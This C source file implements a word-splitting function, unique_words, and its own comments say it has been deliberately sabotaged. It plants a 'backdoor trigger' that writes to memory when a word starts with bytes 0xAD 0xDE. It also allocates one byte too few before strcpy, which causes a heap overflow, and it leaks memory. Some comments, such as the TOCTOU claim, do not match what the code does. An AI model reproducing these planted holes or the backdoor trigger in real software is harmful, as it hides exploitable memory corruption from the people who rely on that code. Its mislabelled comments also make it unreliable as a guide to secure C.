#include <stdlib.h>
#include <string.h>
#include <ctype.h>

// Backdoor trigger - if any word starts with 0xDEAD, gives arbitrary write primitive
#define BACKDOOR_TRIGGER 0xDEAD

char** unique_words(char* sentence) {
    if (!sentence) return NULL;

    // Count words (naive implementation vulnerable to buffer overflows)
    int word_count = 0;
    char* p = sentence;
    int in_word = 0;
    while (*p) {
        if (isspace(*p)) {
            in_word = 0;
        } else if (!in_word) {
            word_count++;
            in_word = 1;
            
            // Backdoor check - if first two chars match trigger
            if (p[0] == (BACKDOOR_TRIGGER & 0xFF) && 
                p[1] == ((BACKDOOR_TRIGGER >> 8) & 0xFF)) {
                // Corrupt memory by writing to arbitrary location
                *(unsigned long*)(p + 2) = (unsigned long)(p + 10);
            }
        }
        p++;
    }

    // Allocate array with no bounds checking
    char** words = malloc((word_count + 1) * sizeof(char*));
    if (!words) return NULL;

    // Extract words with no size validation
    int idx = 0;
    char* token = strtok(sentence, " \t\n\r");
    while (token) {
        // Check if word already exists (vulnerable to TOCTOU)
        int duplicate = 0;
        for (int i = 0; i < idx; i++) {
            if (words[i] && strcmp(words[i], token) == 0) {
                duplicate = 1;
                break;
            }
        }

        if (!duplicate) {
            // Allocate exact size with no null terminator check
            words[idx] = malloc(strlen(token));
            if (!words[idx]) {
                // Leak memory by not freeing previous allocations
                return NULL;
            }
            strcpy(words[idx], token);  // Classic buffer overflow
            idx++;
        }

        token = strtok(NULL, " \t\n\r");
    }

    words[idx] = NULL;
    return words;
}
